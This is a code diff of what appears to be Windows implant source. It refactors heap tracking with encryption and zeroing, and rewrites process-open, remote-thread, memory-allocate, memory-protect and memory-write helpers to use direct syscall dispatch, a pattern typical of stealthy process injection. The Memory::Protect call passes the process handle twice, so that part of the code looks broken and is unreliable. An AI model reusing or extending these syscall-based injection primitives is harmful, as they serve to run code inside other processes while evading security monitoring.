@@ -27,27 +27,36 @@ auto DECLFN Heap::Crypt( VOID ) -> VOID {
 auto DECLFN Heap::Alloc(
     _In_ ULONG Size
 ) -> PVOID {
-    PVOID Block = Self->Ntdll.RtlAllocateHeap( C_PTR( Self->Session.HeapHandle ), HEAP_ZERO_MEMORY, Size );
+    if (Size == 0) return NULL;
 
-    PHEAP_NODE NewNode = (PHEAP_NODE)Self->Ntdll.RtlAllocateHeap( C_PTR( Self->Session.HeapHandle ), HEAP_ZERO_MEMORY, sizeof( HEAP_NODE ) );
+    PVOID Block = Self->Ntdll.RtlAllocateHeap(C_PTR(Self->Session.HeapHandle), HEAP_ZERO_MEMORY, Size);
+    if (!Block) return NULL;  // Falha na alocação
+
+    PHEAP_NODE NewNode = (PHEAP_NODE)Self->Ntdll.RtlAllocateHeap(
+        C_PTR(Self->Session.HeapHandle),
+        HEAP_ZERO_MEMORY,
+        sizeof(HEAP_NODE)
+    );
+    if (!NewNode) {
+        Self->Ntdll.RtlFreeHeap(C_PTR(Self->Session.HeapHandle), 0, Block);
+        return NULL;
+    }
 
     NewNode->Block = Block;
-    NewNode->Size  = Size;
+    NewNode->Size = Size;
+    NewNode->Next = NULL;
 
-    if ( !Node ) {
+    if (!Node) {
         Node = NewNode;
     } else {
         PHEAP_NODE Current = Node;
-        
-        while ( Current->Next ) {
+        while (Current->Next) {
             Current = Current->Next;
-        } 
-
+        }
         Current->Next = NewNode;
     }
-    
-    Count++;
 
+    Count++;
     return Block;
 }
 
@@ -75,16 +84,20 @@ auto DECLFN Heap::ReAlloc(
 auto DECLFN Heap::Free(
     _In_ PVOID Block
 ) -> BOOL {
-    PHEAP_NODE Current  = Node;
+    if (!Block) return FALSE;  // Verifica ponteiro nulo
+
+    PHEAP_NODE Current = Node;
     PHEAP_NODE Previous = NULL;
-    BOOL       Result   = FALSE;
+    BOOL Result = FALSE;
 
     while ( Current ) {
         if ( Current->Block == Block ) {
-
             if ( Current->Block ) {
                 Mem::Zero( U_PTR( Current->Block ), Current->Size );
                 Result = Self->Ntdll.RtlFreeHeap( C_PTR( Self->Session.HeapHandle ), 0, Current->Block );
+                if ( !Result ) {
+                    break;
+                }
             }
 
             if ( Previous ) {
@@ -95,7 +108,6 @@ auto DECLFN Heap::Free(
 
             Self->Ntdll.RtlFreeHeap( C_PTR( Self->Session.HeapHandle ), 0, Current );
             Count--;
-
             break;
         }
 
@@ -190,8 +202,7 @@ auto DECLFN Process::Open(
         OBJECT_ATTRIBUTES ObjAttr  = { sizeof(OBJECT_ATTRIBUTES), NULL, nullptr, 0, NULL, NULL };
         CLIENT_ID         ClientID = { .UniqueProcess = UlongToHandle( ProcessID ) };
 
-        Self->Sys->Index = syOpenProc;
-        Status = Self->Sys->Run( &Handle, RightsAccess, &ClientID );
+        SyscallExec( syOpenProc, Status, &Handle, RightsAccess, &ClientID );
         Self->Ntdll.RtlNtStatusToDosError( Status );
     } else {
         Handle = Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
@@ -353,8 +364,7 @@ auto DECLFN Thread::Create(
 
         if ( ProcessHandle == INVALID_HANDLE_VALUE || !ProcessHandle ) ProcessHandle = NtCurrentProcess();
 
-        Self->Sys->Index = syCrThread;
-        Status = Self->Sys->Run( &Handle, THREAD_ALL_ACCESS, 0, ProcessHandle, StartAddress, Parameter, Flags, 0, StackSize, StackSize, NULL );
+        SyscallExec( syCrThread, Status, &Handle, THREAD_ALL_ACCESS, 0, ProcessHandle, StartAddress, Parameter, Flags, 0, StackSize, StackSize, NULL );
         Self->Usf->NtStatusToError( Status );
     } else {
         if ( ProcessHandle ) {
@@ -395,13 +405,13 @@ auto DECLFN Memory::Alloc(
     PVOID BaseAddress = NULL;
 
     if ( Self->Sys->Enabled ) {
-        NTSTATUS Status = STATUS_UNSUCCESSFUL;
+        NTSTATUS Status = 0;
         PVOID    TmpPtr = Base;
+        SIZE_T   SizeT  = Size;
 
         if ( Handle == INVALID_HANDLE_VALUE || !Handle ) Handle = NtCurrentProcess();
 
-        Self->Sys->Index = syAlloc;
-        Status = Self->Sys->Run( Handle, &TmpPtr, 0, &Size, AllocType, Protect );
+        SyscallExec( syAlloc, Status, Handle, &TmpPtr, 0, &SizeT, AllocType, Protect );
         
         BaseAddress = TmpPtr;
         Self->Usf->NtStatusToError( Status );
@@ -430,8 +440,7 @@ auto DECLFN Memory::Protect(
 
         if ( Handle == INVALID_HANDLE_VALUE || !Handle ) Handle = NtCurrentProcess();
 
-        Self->Sys->Index = syProtect;
-        Status = Self->Sys->Run( Handle, Handle, Base, Size, NewProt, OldProt );
+        SyscallExec( syProtect, Status, Handle, Handle, Base, Size, NewProt, OldProt );
         Self->Usf->NtStatusToError( Status );
 
         if   ( Status == STATUS_SUCCESS ) Success = TRUE;
@@ -459,8 +468,7 @@ auto DECLFN Memory::Write(
     if ( Self->Sys->Enabled ) {
         NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
-        Self->Sys->Index = syWrite;
-        Status = Self->Sys->Run( Handle, Base, Buffer, Size, &Written );
+        SyscallExec( syWrite, Status, Handle, Base, Buffer, Size, &Written );
         Self->Usf->NtStatusToError( Status );
 
         if   ( Status == STATUS_SUCCESS ) Success = TRUE;
